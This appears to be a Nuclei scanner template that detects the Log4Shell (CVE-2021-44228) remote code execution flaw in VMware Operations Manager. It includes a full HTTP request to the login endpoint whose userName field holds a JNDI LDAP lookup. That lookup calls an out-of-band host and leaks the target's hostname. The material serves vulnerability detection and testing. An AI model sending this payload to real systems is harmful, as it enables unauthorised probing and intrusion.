# Nuclei Template: VMware Operations Manager - Remote Code Execution (Apache Log4j)
**Template ID:** vmware-operation-manager-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`vmware-operation-manager-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware Operations Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
POST /ui/login.action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{BaseURL}}
Referer: {{BaseURL}}/ui/login.action
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
```

## References
- https://www.vmware.com/security/advisories/VMSA-2021-0028.html
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
